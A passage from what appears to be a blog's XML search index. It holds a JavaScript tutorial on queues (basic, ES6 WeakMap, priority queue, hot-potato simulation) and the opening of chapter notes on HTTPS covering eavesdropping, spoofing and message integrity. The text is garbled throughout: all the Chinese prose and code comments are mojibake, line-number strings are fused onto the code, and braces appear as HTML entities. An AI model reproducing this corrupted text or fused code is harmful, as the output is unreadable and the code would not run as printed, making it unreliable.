items.shift();&#125; åªæœ‰ enqueue æ–¹æ³•å’Œ dequeue æ–¹æ³•å¯ä»¥æ·»åŠ å’Œç§»é™¤å…ƒç´ ï¼Œè¿™æ ·å°±ç¡®ä¿äº† Queue ç±»éµå¾ªå…ˆè¿›å…ˆå‡ºçš„åŽŸåˆ™ã€‚ æŸ¥çœ‹é˜Ÿåˆ—å¤´å…ƒç´ ä¸ºæˆ‘ä»¬ç±»å®žçŽ°ä¸€äº›é¢å¤–çš„è¾…åŠ©æ–¹æ³•ã€‚æˆ‘ä»¬æƒ³çŸ¥é“é˜Ÿåˆ—æœ€å‰é¢æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨ front æ–¹æ³•æŸ¥çœ‹ 123this.front = function()&#123; return items[0];&#125; æ£€æŸ¥é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º123this.isEmpty = function()&#123; return items.length == 0;&#125; æŸ¥çœ‹é˜Ÿåˆ—çš„é•¿åº¦123this.size = function()&#123; return items.length;&#125; æ‰“å°é˜Ÿåˆ—å…ƒç´ 123this.print = function()&#123; console.log(items.toString());&#125; å®žä¾‹1234567891011121314151617181920212223242526272829303132333435function Queue()&#123; let items = []; this.enqueue = function(element)&#123; return items.push(element); &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125;&#125;let queue = new Queue(); // æ–°å»º ç±» Queue çš„å®žä¾‹ queue console.log(queue.isEmpty()); // é˜Ÿåˆ—æ²¡æœ‰å…ƒç´ ï¼Œè¿”å›ž truequeue.enqueue(5); // å…ˆé˜Ÿåˆ—ä¸­åŠ  5queue.enqueue(8); // å…ˆé˜Ÿåˆ—ä¸­åŠ  8queue.dequeue(); // å‡åŽ»é˜Ÿåˆ—çš„å¼€å¤´console.log(queue.front()); // 8queue.enqueue(11); // å…ˆé˜Ÿåˆ—ä¸­åŠ  11console.log(queue.size()); // é˜Ÿåˆ—çš„é•¿åº¦ 2console.log(queue.isEmpty()); // é˜Ÿåˆ—æœ‰å…ƒç´ ï¼Œè¿”å›ž falsequeue.enqueue(15); // å…ˆé˜Ÿåˆ—ä¸­åŠ  15queue.print(); // è¾“å‡ºé˜Ÿåˆ—ä¸­çš„å…ƒç´  8,11,15 ä½¿ç”¨ES6 è¯­æ³•å®žçŽ°çš„ Queue ç±»æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ª WeakMap æ¥ä¿å­˜ç§æœ‰å±žæ€§itemsï¼Œå¹¶ç”¨å¤–å±‚å‡½æ•°ï¼ˆé—­åŒ…ï¼‰æ¥å°è£… Queue ç±»ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738let Queue = (function()&#123;const items = new WeakMap(); // å£°æ˜Žäº†ä¸€ä¸ª WeakMap ç±»åž‹çš„å˜é‡ itemsclass Queue&#123; constructor()&#123; items.set(this, []) // åœ¨ constructor ä¸­ï¼Œä»¥thisï¼ˆStackç±»è‡ªå·±å¼•ç”¨ï¼‰ä¸ºé”®ï¼ŒæŠŠä»£è¡¨æ ˆçš„æ•°ç»„å­˜å…¥ items &#125; enqueue(element)&#123; let q = items.get(this); q.push(element); &#125; dequeue ()&#123; let q = items.get(this); let r = q.shift(); return r; &#125; front ()&#123; let q = items.get(this); return q[0]; &#125; isEmpty ()&#123; let q = items.get(this); return q.length == 0; &#125; size ()&#123; let q = items.get(this); let r = q.length return r; &#125; clear ()&#123; items.set(this, []) &#125; print ()&#123; let q = items.get(this); console.log(q.toString()); &#125;&#125;return Queue;&#125;)(); ä¼˜å…ˆé˜Ÿåˆ—é˜Ÿåˆ—å¤§é‡åº”ç”¨åœ¨è®¡ç®—æœºç§‘å­¦ä»¥åŠæˆ‘ä»¬çš„ç”Ÿæ´»ä¸­ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯ä¼˜å…ˆé˜Ÿåˆ—ã€‚å…ƒç´ çš„æ·»åŠ å’Œç§»é™¤æ˜¯åŸºäºŽä¼˜å…ˆçº§çš„ã€‚çŽ°å®žä¸­çš„ä¾‹å­å°±æ˜¯ç™»æœºçš„é¡ºåºã€‚å¤´ç­‰èˆ±å’Œå•†åŠ¡èˆ±çš„ä¹˜å®¢ä¼˜å…ˆçº§è¦ä¼˜äºŽç»æµŽèˆ±ä¹˜å®¢ã€‚ å¦å¤–ä¸€ä¸ªçŽ°å®žçš„ä¾‹å­å°±æ˜¯åŒ»é™¢çš„å€™è¯Šå®¤ã€‚åŒ»ç”Ÿä¼šä¼˜å…ˆå¤„ç†ç—…æƒ…æ¯”è¾ƒä¸¥é‡çš„æ‚£è€…ã€‚ å®žçŽ°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œæœ‰ä¸¤ç§é€‰é¡¹ï¼šè®¾ç½®ä¼˜å…ˆçº§ï¼Œç„¶åŽåœ¨æ­£ç¡®çš„ä½ç½®æ·»åŠ å…ƒç´ ï¼›æˆ–è€…ç”¨å…¥åˆ—æ“ä½œæ·»åŠ å…ƒç´ ï¼Œç„¶åŽæŒ‰ç…§ä¼˜å…ˆçº§æ“ä½œå®ƒä»¬ã€‚åœ¨è¿™ä¸ªå®žä¾‹ä¸­ï¼Œæˆ‘ä»¬ä¼šåœ¨æ­£ç¡®çš„ä½ç½®æ·»åŠ å…ƒç´ ï¼Œå› æ­¤å¯ä»¥å¯¹å®ƒä»¬ä½¿ç”¨é»˜è®¤çš„å‡ºåˆ—æ“ä½œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function ProrityQueue()&#123; let items = []; function QueueElement(element, priority)&#123; // å‚æ•°åŒ…å«äº†æ·»åŠ åˆ°é˜Ÿåˆ—çš„å…ƒç´ ä»¥åŠå…¶çš„ä¼˜å…ˆçº§ this.element = element; this.priority = priority; &#125; this.enqueue = function(element, priority)&#123; let queueElement = new QueueElement(element, priority); let added = false; // å¦‚æžœé˜Ÿåˆ—ä¸ºç©ºå¯ä»¥ç›´æŽ¥å°†å…ƒç´ æ’å…¥ï¼Œå¦åˆ™å°±è¦æ¯”è¾ƒå…ƒç´ ä¸Žè¯¥å…ƒç´ çš„ä¼˜å…ˆçº§ã€‚ // å½“æ‰¾åˆ°ä¸€ä¸ªæ¯”è¦æ·»åŠ å…ƒç´ çš„ priority å€¼æ›´é«˜ï¼ˆä¼˜å…ˆçº§æ›´ä½Žï¼‰çš„é¡¹æ—¶ï¼Œ // æˆ‘ä»¬å°±æŠŠå…ƒç´ æ’å…¥å®ƒä¹‹å‰ï¼Œä½†æ˜¯å¦‚æžœä¼˜å…ˆçº§ç›¸åŒçš„è¯å°±éµå¾ªå…ˆè¿›å…ˆå‡ºçš„åŽŸåˆ™ for(let i = 0; i &lt; items.length; i++)&#123; if(queueElement.priority &lt; items[i].priority )&#123; items.splice(i,0,queueElement); added = true; break; &#125; &#125; if(!added)&#123; // å¦‚æžœæ·»åŠ å…ƒç´ çš„ priority å€¼å¤§äºŽä»»ä½•å·²æœ‰çš„å…ƒç´ ï¼ŒæŠŠå®ƒæ·»åŠ åˆ°é˜Ÿåˆ—çš„æœ«å°¾å°±è¡Œäº† items.push(queueElement); &#125; &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; for(let i = 0; i &lt; items.length; i++)&#123; console.log(`$&#123;items[i].element&#125; - $&#123;items[i].priority&#125;`); &#125; &#125;&#125;let prorityQueue = new ProrityQueue();prorityQueue.enqueue('John',2);prorityQueue.enqueue('Mike',1);prorityQueue.enqueue('Jenny',1);prorityQueue.print(); /* Mike - 1 Jenny - 1 John - 2*/ å¾ªçŽ¯é˜Ÿåˆ—â€”â€”å‡»é¼“ä¼ èŠ±è¿˜æœ‰å¦ä¸€ä¸ªä¿®æ”¹ç‰ˆçš„é˜Ÿåˆ—å®žçŽ°ï¼Œå°±æ˜¯å¾ªçŽ¯é˜Ÿåˆ—ã€‚å¾ªçŽ¯é˜Ÿåˆ—çš„ä¸€ä¸ªä¾‹å­å°±æ˜¯å‡»é¼“ä¼ èŠ±æ¸¸æˆï¼ˆHot Potatoï¼‰ã€‚åœ¨è¿™ä¸ªæ¸¸æˆä¸­ï¼Œå­©å­ä»¬å›´æˆä¸€ä¸ªåœ†åœˆï¼ŒæŠŠèŠ±å°½å¿«åœ°ä¼ é€’ç»™æ—è¾¹çš„äººï¼ŒæŸä¸€æ—¶åˆ»ä¼ èŠ±åœæ­¢ï¼Œè¿™ä¸ªæ—¶å€™ï¼ŒèŠ±å°±åœ¨è°çš„æ‰‹é‡Œï¼Œè°å°±é€€å‡ºåœ†åœˆç»“æŸæ¸¸æˆã€‚é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°æœ€åŽä¸€ä¸ªå­©å­ï¼Œå°±æ˜¯èƒœè€…ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è¦å®žçŽ°ä¸€ä¸ªæ¨¡æ‹Ÿçš„å‡»é¼“ä¼ èŠ±æ¸¸æˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function Queue()&#123; let items = []; this.enqueue = function(element)&#123; return items.push(element); &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125;&#125; function hotPotata(nameList, num)&#123; let queue = new Queue(); // å°†å§“ååå• nameList é€ä¸ªåŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ for(let i = 0; i &lt; nameList.length; i++)&#123; queue.enqueue(nameList[i]); &#125; // ç»™å®šä¸€ä¸ªæ•°å­—ï¼Œç„¶åŽè¿­ä»£é˜Ÿä¼ï¼Œä»Žé˜Ÿåˆ—ä¸­å¼€å¤´ç§»é™¤ä¸€é¡¹ // ç„¶åŽå°†å…¶æ·»åŠ åˆ°é˜Ÿä¼çš„æœ«å°¾ï¼Œæ¨¡æ‹Ÿå‡»é¼“ä¼ èŠ± // ä¸€æ—¦ä¼ é€’æ¬¡æ•°è¾¾åˆ°ç»™å®šçš„æ•°å­—ï¼Œæ‹¿ç€èŠ±çš„é‚£ä¸ªäººå°±è¢«æ·˜æ±° let eliminated = ''; while(queue.size() &gt; 1)&#123; for(let i = 0; i &lt; num; i++)&#123; queue.enqueue(queue.dequeue()); &#125; eliminated = queue.dequeue(); console.log(eliminated+'åœ¨å‡»é¼“ä¼ èŠ±æ¸¸æˆä¸­è¢«æ·˜æ±°'); &#125; return queue.dequeue();&#125;let names = ['John', 'Jack', 'Camila', 'Ingrid', 'Carl'];let winner = hotPotata(names, 7);console.log('èŽ·èƒœè€…æ˜¯'+ winner);// Camilaåœ¨å‡»é¼“ä¼ èŠ±æ¸¸æˆä¸­è¢«æ·˜æ±°// Johnåœ¨å‡»é¼“ä¼ èŠ±æ¸¸æˆä¸­è¢«æ·˜æ±°// Carlåœ¨å‡»é¼“ä¼ èŠ±æ¸¸æˆä¸­è¢«æ·˜æ±°// Jackåœ¨å‡»é¼“ä¼ èŠ±æ¸¸æˆä¸­è¢«æ·˜æ±°// èŽ·èƒœè€…æ˜¯Ingrid ä¸‹å›¾æ¨¡æ‹Ÿäº†è¿™ä¸ªè¾“å‡ºè¿‡ç¨‹ï¼š å¯ä»¥æ”¹å˜ä¼ å…¥ hotPotata å‡½æ•°çš„æ•°å­—ï¼Œæ¨¡æ‹Ÿä¸åŒçš„åœºæ™¯ã€‚ JavaScript ä»»åŠ¡é˜Ÿåˆ—å½“æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æ–°æ ‡ç­¾æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ã€‚è¿™æ˜¯å› ä¸ºæ¯ä¸ªæ ‡ç­¾éƒ½æ˜¯å•çº¿ç¨‹å¤„ç†æ‰€æœ‰çš„ä»»åŠ¡ï¼Œå®ƒè¢«ç§°ä¸º äº‹ä»¶å¾ªçŽ¯ã€‚æµè§ˆå™¨è¦è´Ÿè´£å¤šä¸ªä»»åŠ¡ï¼Œå¦‚æ¸²æŸ“ HTML ï¼Œæ‰§è¡Œ JavaScript ä»£ç ï¼Œå¤„ç†ç”¨æˆ·äº¤äº’ï¼ˆç”¨æˆ·è¾“å…¥ï¼Œé¼ æ ‡ç‚¹å‡»ç­‰ï¼‰ï¼Œæ‰§è¡Œå’Œå¤„ç†å¼‚æ­¥è¯·æ±‚ã€‚ å°ç»“è¿™ä¸€ç« å­¦ä¹ äº†é˜Ÿåˆ—è¿™ç§æ•°æ®ç»“æž„ã€‚å®žçŽ°äº†è‡ªå·±çš„é˜Ÿåˆ—ç®—æ³•ï¼Œå­¦ä¹ äº†å¦‚ä½•é€šè¿‡ enqueue æ–¹æ³•å’Œ dequeue æ–¹æ³•æ·»åŠ å’Œç§»é™¤å…ƒç´ ã€‚è¿˜å­¦ä¹ äº†ä¸¤ç§éžå¸¸è‘—åçš„ç‰¹æ®Šé˜Ÿåˆ—çš„å®žçŽ°ï¼Œä¼˜å…ˆé˜Ÿåˆ—å’Œå¾ªçŽ¯é˜Ÿåˆ—ï¼ˆä½¿ç”¨å‡»é¼“ä¼ èŠ±çš„å®žçŽ°ï¼‰ ä¸‹ä¸€ç« ï¼Œå°†å­¦ä¹ é“¾è¡¨ï¼Œä¸€ç§æ¯”æ•°ç»„æ›´åŠ å¤æ‚çš„æ•°æ®ç»“æž„ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬ä¸ƒç« ï¼‰â€”â€” ç¡®ä¿ Web å®‰å…¨çš„ HTTPS]]></title>
    <url>%2F2018-08-29-read-%E5%9B%BE%E8%A7%A3HTTP-Part7.html</url>
    <content type="text"><![CDATA[åœ¨ HTTP åè®®ä¸­æœ‰å¯èƒ½å­˜åœ¨ä¿¡æ¯çªƒå¬æˆ–èº«ä»½ä¼ªè£…ç­‰å®‰å…¨é—®é¢˜ã€‚ä½¿ç”¨ HTTPS é€šä¿¡æœºåˆ¶å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢è¿™äº›é—®é¢˜ã€‚æœ¬ç« æˆ‘ä»¬å°±äº†è§£ä¸€ä¸‹ HTTPSã€‚ã€‚ ç¬¬ä¸ƒç«  ç¡®ä¿ Web å®‰å…¨çš„ HTTPSHTTP çš„ç¼ºç‚¹HTTP ä¸»è¦æœ‰è¿™äº›ä¸è¶³ï¼Œä¾‹å¦‚ é€šä¿¡ä½¿ç”¨æ˜Žæ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œå› æ­¤æœ‰å¯èƒ½é­é‡ä¼ªè£… æ— æ³•è¯æ˜ŽæŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥æœ‰å¯èƒ½å·²é­åˆ°ç¯¡æ”¹ è¿™äº›é—®é¢˜ä¸ä»…åœ¨ HTTP ä¸Šå‡ºçŽ°ï¼Œå…¶ä»–ä¸ºåŠ å¯†çš„åè®®ä¸­ä¹Ÿä¼šå­˜åœ¨è¿™ç±»é—®é¢˜ã€‚ é™¤æ­¤ä¹‹å¤–ï¼ŒHTTP æœ¬èº«è¿˜æœ‰å¾ˆå¤šç¼ºç‚¹ã€‚è€Œä¸”ï¼Œè¿˜æœ‰æƒ³æŸäº›ç‰¹å®šçš„ Web æœåŠ¡å™¨å’Œç‰¹å®šçš„ Web æµè§ˆå™¨åœ¨å®žé™…åº”ç”¨ä¸­å­˜åœ¨çš„ä¸è¶³ï¼ˆä¹Ÿå¯ä»¥è¯´æˆæ˜¯è„†å¼±æ€§æˆ–æ˜¯å®‰å…¨æ¼æ´žï¼‰ã€‚ é€šä¿¡ä½¿ç”¨æ˜Žæ–‡å¯èƒ½ä¼šè¢«çªƒå¬ç”±äºŽ HTTP æœ¬èº«ä¸å…·å¤‡åŠ å¯†çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•åšåˆ°å¯¹é€šä¿¡æ•´ä½“ï¼ˆä½¿ç”¨ HTTPåè®®é€šä¿¡çš„è¯·æ±‚å’Œå“åº”çš„å†…å®¹ï¼‰è¿›è¡ŒåŠ å¯†ã€‚å³ï¼Œ HTTP æŠ¥æ–‡ä½¿ç”¨æ˜Žæ–‡ï¼ˆæŒ‡æœªç»åŠ å¯†çš„æŠ¥æ–‡ï¼‰æ–¹å¼å‘é€ã€‚ TCP/IP æ˜¯å¯èƒ½è¢«çªƒå¬çš„ç½‘ç»œ å¦‚æžœè¦é—®ä¸ºä»€ä¹ˆé€šä¿¡æ—¶ä¸åŠ å¯†æ˜¯ä¸€ä¸ªç¼ºç‚¹ï¼Œè¿™æ˜¯å› ä¸ºæŒ‰ TCP/IP åè®®æ—çš„å·¥ä½œæœºåˆ¶ï¼Œé€šä¿¡å†…å®¹åœ¨æ‰€æœ‰çš„é€šä¿¡çº¿è·¯ä¸Šéƒ½æœ‰å¯èƒ½é­åˆ°çª¥è§†ã€‚ å³ä½¿æ˜¯å·²ç»åŠ å¯†å¤„ç†çš„é€šä¿¡ï¼Œä¹Ÿä¼šè¢«çª¥è§†åˆ°é€šä¿¡å†…å®¹ï¼Œè¿™ç‚¹å’ŒæœªåŠ å¯†çš„é€šä¿¡æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯é€šä¿¡å¦‚æžœç»è¿‡åŠ å¯†ï¼Œå°±æœ‰å¯èƒ½è®©äººæ— æ³•ç ´è§£æŠ¥æ–‡ä¿¡æ¯çš„å«ä¹‰ï¼Œä½†åŠ å¯†å¤„ç†åŽçš„æŠ¥æ–‡æ¶ˆæ¯æœ¬èº«è¿˜æ˜¯ä¼šè¢«çœ‹åˆ°çš„ã€‚ çªƒå¬ç›¸åŒæ®µä¸Šçš„é€šä¿¡å¹¶éžéš¾äº‹ã€‚åªéœ€è¦æ”¶é›†åœ¨äº’è”ç½‘ä¸ŠæµåŠ¨çš„æ•°æ®åŒ…ï¼ˆå¸§ï¼‰å°±è¡Œäº†ã€‚å¯¹äºŽæ”¶é›†æ¥çš„æ•°æ®åŒ…è¿›è¡Œè§£æžå·¥ä½œï¼Œå°±å¯ä»¥èŽ·å–æ•°æ®ã€‚ä¾‹å¦‚è¢«å¹¿æ³›ä½¿ç”¨çš„æŠ“åŒ…å·¥å…· Wiresharkã€‚å®ƒå¯ä»¥èŽ·å– HTTP åè®®çš„è¯·æ±‚å’Œå“åº”çš„å†…å®¹ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£æžã€‚åƒä½¿ç”¨ GET æ–¹æ³•å‘é€è¯·æ±‚ã€å“åº”è¿”å›žäº† 200 OKï¼ŒæŸ¥çœ‹ HTTP å“åº”æŠ¥æ–‡çš„å…¨éƒ¨å†…å®¹ç­‰ä¸€ç³»åˆ—çš„äº‹æƒ…éƒ½å¯ä»¥åšåˆ°ã€‚ åŠ å¯†å¤„ç†é˜²æ­¢è¢«çªƒå¬ åŠ å¯†æŠ€æœ¯æ˜¯å¯ä»¥é˜²æ­¢çªƒå¬ä¿æŠ¤æ¶ˆæ¯çš„ä¸€ä¸ªå¯¹ç­–ã€‚åŠ å¯†çš„å¯¹è±¡å¯ä»¥æœ‰è¿™ä¹ˆå‡ ä¸ª é€šä¿¡åŠ å¯† HTTP åè®®ä¸­æ²¡æœ‰åŠ å¯†æœºåˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡å’Œ SLLï¼ˆSecure Socket Layerï¼Œå®‰å…¨å¥—æŽ¥å±‚ï¼‰æˆ–è€… TLSï¼ˆTransport Layer Securityï¼Œå®‰å…¨å±‚ä¼ è¾“åè®®ï¼‰çš„ç»„åˆä½¿ç”¨ï¼ŒåŠ å¯† HTTP çš„é€šä¿¡å†…å®¹ã€‚ ç”¨ SSL å»ºç«‹å®‰å…¨é€šä¿¡çº¿è·¯ä¹‹åŽï¼Œå°±å¯ä»¥åœ¨è¿™æ¡çº¿è·¯ä¸Šè¿›è¡Œ HTTP é€šä¿¡äº†ã€‚ä¸Ž SSL ç»„åˆä½¿ç”¨çš„ HTTP è¢«ç§°ä¸º HTTPS ï¼ˆHTTP Secureï¼Œè¶…æ–‡æœ¬ä¼ è¾“å®‰å…¨åè®®ï¼‰æˆ–è€… HTTP over SSLã€‚ å†…å®¹çš„åŠ å¯† è¿˜æœ‰ä¸€ç§å°†å‚ä¸Žé€šä¿¡çš„å†…å®¹æœ¬èº«åŠ å¯†çš„æ–¹å¼ã€‚ç”±äºŽ HTTP åè®® ä¸­æ²¡æœ‰åŠ å¯†æœºåˆ¶ï¼Œé‚£ä¹ˆå°±å¯¹ HTTP åè®®ä¼ è¾“çš„å†…å®¹æœ¬èº«åŠ å¯†ã€‚å³æŠŠ HTTP æŠ¥æ–‡é‡ŒåŒ…å«çš„å†…å®¹è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯éœ€è¦å¯¹ HTTP æŠ¥æ–‡è¿›è¡ŒåŠ å¯†å¤„ç†åŽå†å‘é€è¯·æ±‚ã€‚ è¯šç„¶ï¼Œä¸ºäº†åšåˆ°æœ‰æ•ˆçš„å†…å®¹åŠ å¯†ï¼Œå‰ææ˜¯è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶å…·å¤‡åŠ å¯†å’Œè§£å¯†æœºåˆ¶ã€‚ä¸»è¦åº”ç”¨åœ¨ Web æœåŠ¡ä¸­ã€‚æœ‰ä¸€ç‚¹å¿…é¡»å¼•èµ·æ³¨æ„ï¼Œç”±äºŽè¯¥æ–¹å¼ä¸åŒäºŽ SSL æˆ–è€… TLS å°†æ•´ä¸ªé€šä¿¡çº¿è·¯åŠ å¯†å¤„ç†ï¼Œæ‰€ä»¥å†…å®¹ä»æœ‰è¢«ç¯¡æ”¹çš„é£Žé™©ã€‚ ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½å°±æœ‰å¯èƒ½é­é‡ä¼ªè£…HTTP åè®®ä¸­çš„è¯·æ±‚å’Œå“åº”ä¸ä¼šå¯¹é€šä¿¡æ–¹è¿›è¡Œç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨â€œæœåŠ¡å™¨æ˜¯å¦å°±æ˜¯å‘é€è¯·æ±‚ä¸­ URI çœŸæ­£æŒ‡å®šçš„ä¸»æœºï¼Œè¿”å›žå“åº”æ˜¯å¦çœŸçš„è¿”å›žåˆ°å®žé™…æå‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯â€ç­‰ç±»ä¼¼é—®é¢˜ã€‚ ä»»ä½•äººéƒ½å¯ä»¥å‘èµ·è¯·æ±‚ åœ¨ HTTP åè®®é€šä¿¡æ—¶ï¼Œç”±äºŽä¸å­˜åœ¨ç¡®è®¤é€šä¿¡æ–¹çš„å¤„ç†æ­¥éª¤ï¼Œä»»ä½•äººéƒ½å¯ä»¥å‘èµ·è¯·æ±‚ã€‚å¦å¤–æœåŠ¡å™¨åªè¦æŽ¥æ”¶åˆ°è¯·æ±‚ï¼Œä¸ç®¡å¯¹æ–¹æ˜¯è°éƒ½ä¼šè¿”å›žä¸€ä¸ªå“åº”ï¼ˆä½†ä¹Ÿä»…é™äºŽå‘é€ç«¯çš„ IP åœ°å€å’Œç«¯å£å·æ²¡æœ‰è¢« Web æœåŠ¡å™¨è®¾å®šé™åˆ¶è®¿é—®çš„å‰æä¸‹ï¼‰ HTTP åè®®çš„å®žçŽ°æœ¬èº«éžå¸¸ç®€å•ï¼Œæ— è®ºæ˜¯è°å‘é€è¿‡æ¥çš„è¯·æ±‚éƒ½ä¼šè¿”å›žå“åº”ï¼Œå› æ­¤ä¸ç¡®è®¤é€šä¿¡æ–¹ï¼Œä¼šå­˜åœ¨ä»¥ä¸‹éšæ‚£ã€‚ æ— æ³•ç¡®è®¤è¯·æ±‚å‘é€è‡³ç›®æ ‡çš„ Web æœåŠ¡å™¨æ˜¯å¦æ˜¯æŒ‰çœŸå®žæ„å›¾è¿”å›žå“åº”çš„é‚£å°æœåŠ¡å™¨ã€‚æœ‰å¯èƒ½æ˜¯å·²ä¼ªè£…çš„ Web æœåŠ¡å™¨ã€‚ æ— æ³•ç¡®è®¤å“åº”è¿”å›žåˆ°çš„å®¢æˆ·ç«¯æ˜¯å¦æŒ‰çœŸå®žæ„å›¾æŽ¥å—å“åº”çš„é‚£ä¸ªå®¢æˆ·ç«¯ã€‚æœ‰å¯èƒ½æ˜¯å·²ä¼ªè£…çš„å®¢æˆ·ç«¯ã€‚ æ— æ³•ç¡®å®šæ­£åœ¨é€šä¿¡çš„å¯¹æ–¹æ˜¯å¦å…·å¤‡è®¿é—®æƒé™ã€‚å› ä¸ºæŸäº› Web æœåŠ¡å™¨ä¸Šä¿å­˜ç€é‡è¦çš„ä¿¡æ¯ï¼Œåªæƒ³å‘ç»™ç‰¹å®šç”¨æˆ·é€šä¿¡çš„æƒé™ã€‚ æ— æ³•åˆ¤å®šè¯·æ±‚æ˜¯æ¥è‡ªä½•æ–¹ã€å‡ºè‡ªè°æ‰‹ã€‚ å³ä½¿æ˜¯æ— æ„ä¹‰çš„è¯·æ±‚ä¹Ÿä¼šç…§å•å…¨æ”¶ã€‚æ— æ³•é˜»æ­¢æµ·é‡è¯·æ±‚ä¸‹çš„ DoS æ”»å‡»ï¼ˆDenial of Serviceï¼Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰ æŸ¥æ˜Žå¯¹æ‰‹çš„è¯ä¹¦ è™½ç„¶ä½¿ç”¨ HTTP åè®®æ— æ³•ç¡®å®šé€šä¿¡æ–¹ï¼Œä½†å¦‚æžœä½¿ç”¨ SSL åˆ™å¯ä»¥ã€‚ SSL ä¸ä»…æä¾›åŠ å¯†å¤„ç†ï¼Œè€Œä¸”è¿˜ä½¿ç”¨äº†ä¸€ç§è¢«ç§°ä¸ºè¯ä¹¦çš„æ‰‹æ®µã€‚å¯ç”¨äºŽç¡®å®šæ–¹ã€‚ è¯ä¹¦ç”±å€¼å¾—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹æœºæž„é¢å‘ï¼Œç”¨ä»¥è¯æ˜ŽæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯æ˜¯å®žé™…å­˜åœ¨çš„ã€‚å¦å¤–ï¼Œä¼ªé€ è¯ä¹¦ä»ŽæŠ€æœ¯è§’åº¦æ¥è¯´æ˜¯å¼‚å¸¸å›°éš¾çš„ä¸€ä»¶äº‹ã€‚æ‰€ä»¥åªè¦èƒ½å¤Ÿç¡®è®¤é€šä¿¡æ–¹ï¼ˆæœåŠ¡å™¨æˆ–è€…æ˜¯å®¢æˆ·ç«¯ï¼‰æŒæœ‰çš„è¯ä¹¦ã€‚å³å¯ä»¥åˆ¤æ–­é€šä¿¡æ–¹çš„çœŸå®žæ„å›¾ã€‚ é€šè¿‡ä½¿ç”¨è¯ä¹¦ï¼Œä»¥è¯æ˜Žé€šä¿¡æ–¹å°±æ˜¯æ„æ–™ä¸­çš„æœåŠ¡å™¨ã€‚è¿™å¯¹ä½¿ç”¨è€…ä¸ªäººæ¥è®²ï¼Œä¹Ÿå‡å°‘äº†ä¸ªäººä¿¡æ¯æ³„éœ²çš„å±é™©æ€§ã€‚ å¦å¤–ï¼Œå®¢æˆ·ç«¯æŒæœ‰è¯ä¹¦å³å¯å®Œæˆä¸ªäººèº«ä»½çš„ç¡®è®¤ï¼Œä¹Ÿå¯ç”¨äºŽå¯¹ Web ç½‘ç«™çš„è®¤è¯çŽ¯èŠ‚ã€‚ æ— æ³•è¯æ˜ŽæŠ¥æ–‡å®Œæ•´æ€§ï¼Œå¯èƒ½å·²é­ç¯¡æ”¹æ‰€è°“å®Œæ•´æ€§æ˜¯æŒ‡ä¿¡æ¯çš„å‡†ç¡®åº¦ã€‚è‹¥æ— æ³•è¯æ˜Žå…¶å®Œæ•´æ€§ï¼Œé€šå¸¸æ„å‘³ç€æ— æ³•åˆ¤æ–­ä¿¡æ¯æ˜¯å¦å‡†ç¡®ã€‚ æŽ¥å—çš„å†…å®¹å¯èƒ½æœ‰è¯¯ ç”±äºŽ HTTP åè®®æ— æ³•è¯æ˜Žé€šä¿¡çš„æŠ¥æ–‡å®Œæ•´æ€§ï¼Œå› æ­¤ï¼Œåœ¨è¯·æ±‚æˆ–å“åº”é€å‡ºä¹‹åŽç›´åˆ°å¯¹æ–¹æŽ¥æ”¶ä¹‹å‰çš„è¿™æ®µæ—¶é—´å†…ï¼Œå³ä½¿è¯·æ±‚æˆ–å“åº”çš„å†…å®¹é­åˆ°ç¯¡æ”¹ï¼Œä¹Ÿæ²¡æœ‰åŠžæ³•èŽ·æ‚‰ã€‚ 